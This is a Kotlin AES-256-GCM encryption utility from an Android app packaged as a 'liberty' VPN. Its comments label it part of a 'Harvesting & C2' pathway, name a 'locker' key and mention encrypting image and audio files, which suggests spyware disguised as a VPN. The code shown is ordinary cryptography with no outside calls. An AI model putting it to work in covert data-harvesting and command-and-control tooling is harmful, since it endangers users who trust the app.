package com.iran.liberty.vpn

import android.content.Context
import android.util.Base64
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * AES-256-GCM encryption/decryption utilities for payloads
 * Pathway 4: Harvesting & C2 Developer
 */
object CryptoUtil {
    
    private const val PREFS_NAME = "LibertyCrypto"
    private const val KEY_ALIAS = "abbyslocker_key"
    private const val IV_SIZE = 12 // GCM recommended IV size
    
    /**
     * Get or generate device-specific encryption key
     * In production, derive from device ID + package name
     */
    private fun getOrCreateKey(context: Context): SecretKey {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val encodedKey = prefs.getString(KEY_ALIAS, null)
        
        return if (encodedKey != null) {
            // Decode existing key
            val keyBytes = Base64.decode(encodedKey, Base64.DEFAULT)
            SecretKeySpec(keyBytes, Constants.KEY_ALGORITHM)
        } else {
            // Generate new key
            val keyGenerator = KeyGenerator.getInstance(Constants.KEY_ALGORITHM)
            keyGenerator.init(Constants.KEY_SIZE, SecureRandom())
            val key = keyGenerator.generateKey()
            
            // Save for future use
            prefs.edit()
                .putString(KEY_ALIAS, Base64.encodeToString(key.encoded, Base64.DEFAULT))
                .apply()
            
            key
        }
    }
    
    /**
     * Encrypt plaintext using AES-256-GCM
     * Returns base64 encoded string of IV + ciphertext
     */
    fun encrypt(context: Context, plaintext: String): String {
        val key = getOrCreateKey(context)
        val cipher = Cipher.getInstance(Constants.ENCRYPTION_ALGORITHM)
        
        // Generate random IV
        val iv = ByteArray(IV_SIZE)
        SecureRandom().nextBytes(iv)
        
        // Initialize cipher for encryption
        val gcmSpec = GCMParameterSpec(Constants.GCM_TAG_LENGTH, iv)
        cipher.init(Cipher.ENCRYPT_MODE, key, gcmSpec)
        
        // Encrypt
        val ciphertext = cipher.doFinal(plaintext.toByteArray(Charsets.UTF_8))
        
        // Combine IV + ciphertext and encode as base64
        val output = ByteArray(iv.size + ciphertext.size)
        System.arraycopy(iv, 0, output, 0, iv.size)
        System.arraycopy(ciphertext, 0, output, iv.size, ciphertext.size)
        
        return Base64.encodeToString(output, Base64.DEFAULT)
    }
    
    /**
     * Decrypt base64 encoded string (IV + ciphertext)
     */
    fun decrypt(context: Context, encryptedBase64: String): String {
        val key = getOrCreateKey(context)
        val cipher = Cipher.getInstance(Constants.ENCRYPTION_ALGORITHM)
        
        // Decode base64
        val encryptedBytes = Base64.decode(encryptedBase64, Base64.DEFAULT)
        
        // Extract IV (first 12 bytes)
        val iv = encryptedBytes.copyOfRange(0, IV_SIZE)
        
        // Extract ciphertext (remaining bytes)
        val ciphertext = encryptedBytes.copyOfRange(IV_SIZE, encryptedBytes.size)
        
        // Initialize cipher for decryption
        val gcmSpec = GCMParameterSpec(Constants.GCM_TAG_LENGTH, iv)
        cipher.init(Cipher.DECRYPT_MODE, key, gcmSpec)
        
        // Decrypt
        val plaintextBytes = cipher.doFinal(ciphertext)
        return String(plaintextBytes, Charsets.UTF_8)
    }
    
    /**
     * Encrypt byte array (for image/audio files)
     */
    fun encryptBytes(context: Context, data: ByteArray): ByteArray {
        val key = getOrCreateKey(context)
        val cipher = Cipher.getInstance(Constants.ENCRYPTION_ALGORITHM)
        
        // Generate random IV
        val iv = ByteArray(IV_SIZE)
        SecureRandom().nextBytes(iv)
        
        // Initialize cipher
        val gcmSpec = GCMParameterSpec(Constants.GCM_TAG_LENGTH, iv)
        cipher.init(Cipher.ENCRYPT_MODE, key, gcmSpec)
        
        // Encrypt
        val ciphertext = cipher.doFinal(data)
        
        // Return IV + ciphertext
        val output = ByteArray(iv.size + ciphertext.size)
        System.arraycopy(iv, 0, output, 0, iv.size)
        System.arraycopy(ciphertext, 0, output, iv.size, ciphertext.size)
        
        return output
    }
    
    /**
     * Decrypt byte array (IV + ciphertext)
     */
    fun decryptBytes(context: Context, encryptedData: ByteArray): ByteArray {
        val key = getOrCreateKey(context)
        val cipher = Cipher.getInstance(Constants.ENCRYPTION_ALGORITHM)
        
        // Extract IV
        val iv = encryptedData.copyOfRange(0, IV_SIZE)
        val ciphertext = encryptedData.copyOfRange(IV_SIZE, encryptedData.size)
        
        // Initialize cipher
        val gcmSpec = GCMParameterSpec(Constants.GCM_TAG_LENGTH, iv)
        cipher.init(Cipher.DECRYPT_MODE, key, gcmSpec)
        
        // Decrypt
        return cipher.doFinal(ciphertext)
    }
    
    /**
     * Generate hash for data integrity verification
     */
    fun generateHash(data: String): String {
        val digest = java.security.MessageDigest.getInstance("SHA-256")
        val hashBytes = digest.digest(data.toByteArray(Charsets.UTF_8))
        return Base64.encodeToString(hashBytes, Base64.DEFAULT)
    }
}